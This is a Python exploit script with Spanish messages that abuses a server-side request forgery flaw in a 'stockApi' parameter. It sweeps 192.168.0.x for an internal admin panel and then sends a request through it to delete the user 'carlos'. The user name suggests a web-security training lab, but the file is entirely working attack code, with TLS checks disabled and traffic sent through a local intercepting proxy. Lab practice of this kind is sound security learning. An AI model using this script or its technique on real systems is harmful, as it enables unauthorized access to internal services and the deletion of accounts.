import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies_setting = {'http': 'http://127.0.0.1:8080','https': 'http://127.0.0.1:8080'}

def main():
    if len(sys.argv) !=2:
        print(f"(+) Uso: {sys.argv[0]} <url>")
        print(f"(+) Ejemplo: {sys.argv[0]} www.ejemplo.com")
        exit(-1)
    
    base_url = sys.argv[1]
    print("(+) Buscando el panel de admin...")
    admin_panel = find_host(base_url)
    if admin_panel:
        print(f"(+) Panel admin encontrado en: {admin_panel}")
        print(f"(+) Intentando eliminar el usuario...")
        delete_user(base_url,admin_panel)
        
    
        


def find_host(base_url):
    url_sotck = f"{base_url}/product/stock"
    
    for ip in range(1,254):
        payload = f'http://192.168.0.{ip}:8080/admin'
        data_stockapi = {'stockApi': payload}
        response = requests.post(url_sotck,data=data_stockapi,verify=False,proxies=proxies_setting)
        if response.status_code == 200:
            #print(f"(+) Panel admin encontrado en: {payload}")
            return payload
            break

    

def delete_user(base_url,admin_panel):

    url_stock = f"{base_url}/product/stock"
    url_delelte_user = f"{admin_panel}/delete?username=carlos"
    data_delete = {'stockApi': url_delelte_user}
    response = requests.post(url_stock,data=data_delete,verify=False,proxies=proxies_setting)
    
    #valido si elimino el usuario
    data_delete = {'stockApi': admin_panel}
    response2 = requests.post(url_stock,data=data_delete,verify=False,proxies=proxies_setting)
    if "User delete" in response2.text:
        print("(+) Usuario eliminado.")
    else:
        print("(-) El usuario no fue eliminado.")
    
if __name__ == "__main__":
    main()